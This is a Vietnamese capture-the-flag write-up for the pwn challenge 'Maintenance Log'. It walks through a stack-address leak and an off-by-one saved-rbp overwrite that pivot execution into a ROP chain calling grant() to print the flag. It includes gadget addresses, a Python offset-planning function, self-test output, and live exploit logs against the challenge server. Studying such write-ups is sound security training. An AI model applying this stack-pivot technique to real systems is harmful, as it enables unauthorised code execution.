# Maintenance Log - Pwn (150 điểm)

**Cờ:** `CSSCTF{Duh_m4t3_1_4m_sl33py}`
**File đính kèm:** `chall` (Kích thước: 14.480 B, SHA256: `de630ba8...b118e3`), `Dockerfile`, `flag.txt`
**Dịch vụ mạng:** `nc 34.116.80.78 7312`

## Đề bài

Hệ thống thiết lập một giao diện điều khiển (terminal) mô phỏng quy trình bảo trì, hiển thị dòng banner chào mừng và yêu cầu hai trường thông tin: Tóm tắt nội dung báo cáo (summary) và tên định danh thẻ nhân sự (tag). Trong mô tả, bên cung cấp dịch vụ khẳng định hệ thống "được gia cố bằng cấu trúc stack canary, đảm bảo an toàn tuyệt đối trước các hình thức khai thác tham nhũng bộ nhớ (memory corruption)". Dù vậy, trong luồng hoạt động chính, giao diện lại xuất ra nguyên văn một địa chỉ bộ nhớ kèm thông báo `IS LEAKING`. Mục tiêu cuối cùng là giành được "quyền quản trị" (administrative clearance) bằng cách chuyển hướng thực thi mã (code execution) vào khối lệnh phân quyền, qua đó truy xuất nội dung tệp `flag.txt` tồn tại trên máy chủ.

## Phân tích ban đầu

Kiểm tra tệp tin `chall`: Định dạng ELF 64-bit với phân loại `Type: EXEC`, chứng tỏ tính năng ngẫu nhiên hóa không gian địa chỉ PIE (Position Independent Executable) hoàn toàn bị vô hiệu hóa (no-PIE). Nhờ đó, tất cả các cấu trúc địa chỉ mã lệnh đều tĩnh và cố định, điều này cho phép thiết lập chuỗi Return-Oriented Programming (ROP) mà không yêu cầu thực hiện rò rỉ (leak) bộ nhớ để tìm kiếm địa chỉ mã. Cơ chế chống thực thi (NX) đang được kích hoạt, tính năng RELRO bật ở mức độ một phần (partial RELRO), và tệp nhị phân đã bị tước bỏ nhãn (stripped). Tiến hành rà quét cấu trúc khối `.text`, thu thập được các vùng mã nguồn (gadgets) đóng vai trò then chốt (Lưu ý: hai địa chỉ `0x40124d` và `0x40124f` không thuộc phân loại hàm độc lập, mà là các đoạn gadget xuất hiện do bộ biên dịch chèn lớp đệm - padding - giữa các khối hàm):

| Địa chỉ | Vai trò kỹ thuật | Trạng thái Canary |
| --- | --- | --- |
| `0x4011b6` | Hàm cấu hình `io_setup()`: Thực thi lệnh `setvbuf(stdin/stdout/stderr, _IONBF)` | Có bảo vệ |
| `0x401268` | Hàm điều phối phân quyền `grant(int, int)` - **Mã lệnh chết (dead code)**, không có cơ chế nào trong luồng chính thực hiện lệnh gọi. | Có bảo vệ |
| `0x40124d` | Gadget `pop rdi; ret` (Ẩn trong vùng đệm khối hàm) | Không áp dụng |
| `0x40124f` | Gadget `pop rsi; ret` | Không áp dụng |
| `0x401348` | Hàm thực thi bộ điều hướng `operator()` | Không bảo vệ |
| `0x40139a` | Hàm xuất báo cáo `report()` | Không bảo vệ |

Hàm `grant(edi, esi)` áp dụng kiểm duyệt hai biến tĩnh: `edi == 0xdeadbeef` và `esi == 0xcafebabe`. Nếu tham số hợp lệ, khối lệnh sẽ xử lý gọi các hàm liên hoàn gồm `fopen("flag.txt")`, `fgets`, `puts` và dừng tiến trình bằng `exit(0)`. Ngược lại, xuất thông báo cảnh báo lỗi xác thực `[-] Authentication token mismatch.`. Hàm `grant` đóng vai trò là "chu vi an ninh" (perimeter) cần phải chiếm quyền, vì nó nắm giữ độc quyền cấu trúc truy cập tệp `flag.txt`.

Thống kê chỉ ra rằng hệ thống chỉ áp đặt cơ chế phòng thủ canary (nguyên tắc của vendor) lên 3 chức năng: `io_setup`, `grant`, và `main`. Tuy nhiên, ngay cả khi cơ chế này xuất hiện trong hàm `main`, nó vẫn mất tác dụng do khối lượng công việc được ủy thác trực tiếp sang lệnh `exit` thuộc hàm `grant` trước khi cơ chế kiểm tra (check) được triển khai. Đặc biệt nghiêm trọng, cả hai hàm `report()` và `operator()` đều không hề có cơ chế stack canary bảo vệ. Ngoài ra, hàm `report()` đã làm rò rỉ công khai cấu trúc địa chỉ vùng đệm:

```assembly
0x4013b8: lea rax,[rbp-0x50]; mov rsi,rax
0x4013bf: lea rax,[rip+0xcd2]   # Kết xuất: "[*] Report buffer allocated at: %p"
```

Dữ liệu `Report buffer` này chính là luồng leak mà mô tả bài toán nhắc tới. Phân tích thêm, hàm `report()` thực hiện lời gọi `read(0, rbp-0x50, 0x50)` - mức giới hạn kích thước đọc (0x50) được đồng bộ một cách an toàn so với độ lớn vùng đệm, không gây tràn (buffer overflow). Kế tiếp, tiến trình kích hoạt hàm phụ `operator()` mang theo các chỉ thị sai lệch sau:

```assembly
0x401350: memset(rbp-0x20, 0, 0x20)
0x40137a: mov QWORD PTR [rbp-0x28], 0x21
0x401392: read(0, rbp-0x20, 0x21)     # Thực thi đọc 33 byte đối với vùng đệm thiết kế 32 byte
```

Lỗ hổng trọng tâm nằm ở lệnh cuối: Một lỗi dư byte (Off-by-one). Tại byte thứ 33, dữ liệu thừa sẽ rơi trực tiếp, và đè lấp lên slot chứa địa chỉ khung Base Pointer (saved rbp).

## Chuỗi khai thác

**Bước 1 - Lập bản đồ bộ nhớ ngăn xếp (Stack layout).** 
Đặt biến số `X = rbp_main`, ánh xạ theo đúng trình tự khối khởi tạo (prologue) và khối dọn dẹp (epilogue):

```text
Từ X-0xA0 đến X-0x81 : Khối đệm 32 byte thuộc hàm operator() (Cho phép tùy chỉnh nội dung)
Mốc X-0x80           : Vị trí lưu saved rbp của hàm operator(), giữ giá trị X-0x20 <- Nơi chứa LSB bị lỗ hổng Off-by-one can thiệp
Mốc X-0x78           : Địa chỉ trả về (Return address) của hàm report() (0x401407), nằm ngoài tầm thao túng
Từ X-0x70 đến X-0x21 : Khối đệm 80 byte thuộc hàm report() (Cho phép tùy chỉnh nội dung chứa ROP chain, định danh P = X-0x70)
Mốc X-0x20           : Vị trí lưu saved rbp của hàm report(), giữ giá trị X
Mốc X-0x18           : Địa chỉ trả về (Return address) chuyển hướng vào hàm main (0x401453)
```

**Bước 2 - Hình thành công cụ rẽ nhánh từ lỗ hổng 1 byte (Primitive extraction).** 
Sau khi hàm `operator()` kết thúc tiến trình, khối `report()` sẽ xuất báo cáo xử lý `[*] Processing report...` và tự động thực hiện chuỗi lệnh làm sạch và kết thúc cấu trúc hàm (`leave; ret`). Tại mốc thời điểm này, giá trị của thanh ghi cơ sở `rbp_report` đã bị chỉnh sửa sai lệch thành `(X-0x20) & ~0xFF | z`, trong đó biến số `z` chính là giá trị byte dư (byte thứ 33) được truyền lên từ mã khai thác. Sơ đồ trạng thái khi đó:

```text
Chỉ thị leave      -> Hệ thống thiết lập thanh ghi rsp = B + z (Với B = (X-0x20) & ~0xFF, giữ tính ổn định của 8 byte cao)
Chỉ thị pop rbp    -> Trạng thái cập nhật: rsp = B + z + 8
Chỉ thị ret        -> Thiết lập điểm thực thi: rip = qword[B + z + 8]
```

Với `z` dao động ngẫu nhiên trong dải phổ 256 giá trị, kịch bản khai thác được trao quyền quyết định đích đến của lệnh `ret` (lấy địa chỉ cho lệnh `rip`), thông qua một khung cửa sổ bộ nhớ có kích thước 256 byte vây quanh ngưỡng `X-0x20`. Tại thời điểm này, dữ liệu leak của tham số `P` đã thu được, kịch bản tính toán `X = P + 0x70` và định hình ngay lập tức giá trị `B`. Không phát sinh nhu cầu dò quét bất kỳ dữ liệu leak nào khác, và ô cửa sổ 256 byte quét qua hoàn toàn tương thích, trùng khớp lên khối đệm 80 byte nằm trong hàm `report()`, nơi cấu trúc ROP đã được phục kích sẵn.

**Bước 3 - Cấu hình ràng buộc gọi vùng đệm.** 
Một chuỗi (chain) ROP thực thi phân quyền thành công cần quy tụ 5 vùng giá trị (tổng dung lượng 40 byte):

```text
Mốc +0   Lệnh pop rdi; ret (0x40124d)     Mốc +8   Khởi tạo tham số 0xdeadbeef
Mốc +16  Lệnh pop rsi; ret (0x40124f)     Mốc +24  Khởi tạo tham số 0xcafebabe
Mốc +32  Thực thi grant()  (0x401268)
```

Giả sử đoạn ROP được cấu trúc bắt đầu tại vị trí offset `O` bên trong vùng nhớ đệm, phương trình suy diễn kết nối là `A = P + O = B + z + 8`, dẫn xuất biến `z = O + L - 88` (với hệ số `L = (X-0x20) & 0xFF`). Hệ thống phải thỏa mãn 3 ràng buộc khắt khe nhất định:
1. Giá trị `z` phải thuộc dải mã hóa `[0, 255]`, yêu cầu `O >= 88 - L`.
2. Kích thước bù đắp (offset) `O <= 40` để tránh tình trạng tràn biên vùng đệm.
3. Tham số `O` bắt buộc phải là ước chung là bội số của 16, đảm bảo thanh ghi `rsp % 16 == 8` (Theo quy chuẩn hàm SysV AMD64, một yếu tố cực kỳ quan trọng vì hàm thư viện glibc 2.39 ứng dụng bên trong `fopen` và `fgets` luôn kích hoạt kiểm tra độ đồng trục địa chỉ của tập lệnh vector SSE).
Vì hằng số `X` luôn có tính chất bội số của 16, trong khi hệ số `L` mang yếu tố hỗn loạn bởi 8 bit thấp nhất (do ngẫu nhiên hóa ASLR), các giá trị `L ∈ {0, 16, 32, 48}` sẽ dẫn đến tình trạng phương trình bất phân giải (không tìm thấy tham số `O` nào tương thích). Đối với trường hợp này, quy trình tái khởi động lại yêu cầu (để nhận khung stack mới) có xác suất xấp xỉ 3/4. 

```python
def plan(leak_p):
    x = leak_p + 0x70
    b = (x - 0x20) & ~0xFF
    for off in (0, 16, 32):
        z = leak_p + off - 8 - b
        if 0 <= z <= 0xFF:
            return off, z          # Output tham số `z` biểu thị định danh byte lỗi thứ 33 gửi tới hàm operator()
    return None
```

**Bước 4 - Kiểm thử Offline (Dry run) trước khi khai thác.** 
Công cụ `analysis/selftest.py` khởi chạy mạng mô phỏng (fake socket) tích hợp với vùng nhớ thiết lập phẳng. Bộ mã này giả lập tuần tự quá trình tương tác cơ bản (push rbp, leave, pop rbp, ret) dựa hoàn toàn trên mã máy dịch ngược thực tế (disassembly) và sử dụng thuật toán nội suy (`plan`, `payload`, `attempt`) được đồng bộ với tệp `exploit.py` cốt lõi. Chạy rà quét ngẫu nhiên 16 giá trị `X mod 256`:

```text
[*] Thống kê mô phỏng: thành công=12, plan_bỏ_qua=4, thất_bại=0
[*] Chạy đối chứng (Không tích hợp ROP): result='rip=0x4141414141414141' flag=None
[*] Chạy đối chứng (Giá trị z sai số 1 byte): result='rip=0xef00000000004012'
[+] Quy trình selftest vượt rào thành công (OK)
```

12 phiên bản tạo ra quyền đọc tệp flag; 4 trường hợp hệ thống phát hiện yếu tố lệch tâm `L < 56` nên bị từ chối chính xác (tự chứng minh khung giả lập không tự bị đánh lừa). Các cấu hình mẫu "không hỗ trợ ROP" và "lệch 1 byte" đều gây sập hệ thống (fail) đúng dự kiến, kiểm chứng mức độ chính xác của cơ cấu (harness) trong việc xác minh hệ thống có thực sự kích hoạt và rẽ nhánh đúng theo dự kiến hay không. Chính cơ cấu mô phỏng tự động này đã đóng vai trò phát hiện sự cố từ phiên bản nghiên cứu thứ 3 của người phân tích: Mô hình ban đầu đọc nhầm lệnh trả về với thông số `qword[rbp]` thay cho thông số `qword[rbp+8]` (thiếu bước khôi phục rbp). Lỗi đó gây kết xuất trạng thái `rip=0`. Sau khi sửa đổi cấu hình, toàn bộ 12/16 tình huống đã mô phỏng thành công.

**Bước 5 - Khai thác và thâm nhập hệ thống mục tiêu.** 
Vòng lặp tương tác: Duy trì kết nối, cấp một phiên định tuyến (thread) riêng lẻ; đọc tọa độ (leak), gửi payload 80 byte chứa cấu trúc ROP; đẩy tải trọng lỗi 33 byte can thiệp phân quyền, sau đó chờ thu phản hồi máy chủ.

```text
[*] Vòng quét 1/8 -> Máy chủ: 34.116.80.78 Cổng: 7312
[*] Giá trị P = 0x7ffdd96ba300 (P%16=0) -> Tham số offset=16 z=0x8 Phân bổ rip<-[0x7ffdd96ba310]
[*] Dữ liệu phản hồi:
[*] Processing report...
[+] Access Granted! Here is your flag:
CSSCTF{Duh_m4t3_1_4m_sl33py}
[+] Trích xuất cờ thành công: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Kiểm tra chu trình với kết nối lần 2 nhằm xác nhận độ tin cậy của thuật toán `plan` (kiểm tra tính chất tự động thích ứng với cấu trúc địa chỉ bộ nhớ).

```text
[*] Vòng quét 1/8 -> Máy chủ: 34.116.80.78 Cổng: 7312
[*] Giá trị P = 0x7ffda1427b30 (P%16=0) -> Tham số offset=0 z=0x28 Phân bổ rip<-[0x7ffda1427b30]
[+] Trích xuất cờ thành công: CSSCTF{Duh_m4t3_1_4m_sl33py}
```

Vòng số 2 xử lý với thông số `offset=0`, trong khi vòng 1 áp dụng tham số `offset=16`. Kết quả này khẳng định hàm tự tính `plan()` có khả năng phân luồng và hiệu chuẩn tọa độ tự động linh hoạt theo từng phiên. Dữ liệu nhận được khác hẳn nội dung bản nháp `CSSCTF{definetely_not_flag}`, chứng nhận đây là cấu trúc thật của hệ thống không phải tệp đính kèm cục bộ.

## Flag

Kết quả:
```text
CSSCTF{Duh_m4t3_1_4m_sl33py}
```

## Reproduce

Quá trình tự động tái thiết lập bằng kịch bản:

```bash
python exploit.py                    # Tiến hành thực thi tấn công máy chủ (IP tĩnh, tự điều chỉnh thông số offset)
python exploit.py <host> <port> 8    # Thực thi theo tham số mở: cấu hình host/port/số_chu_kỳ kết nối tối đa
python exploit.py --probe            # Chế độ gửi tải trọng thử nghiệm, kiểm định cơ cấu đường ống mạng (flow)
python analysis/selftest.py          # Triển khai bộ giả lập ngoại tuyến, kiểm thử kết xuất hệ tọa độ frame stack
```

Khuyến nghị môi trường cần có thư viện `pwntools`. Tệp máy thuộc phân loại không gian tĩnh (no-PIE) bảo đảm toàn bộ tọa độ điều khiển tiện ích (gadget) là giá trị tuyệt đối không xê dịch. Chuỗi tấn công không đòi hỏi cơ cấu leak địa chỉ code; mục tiêu được bảo đảm miễn trích xuất đúng luồng tín hiệu báo cáo địa chỉ stack trực tiếp từ 8 bit thấp để kích hoạt.
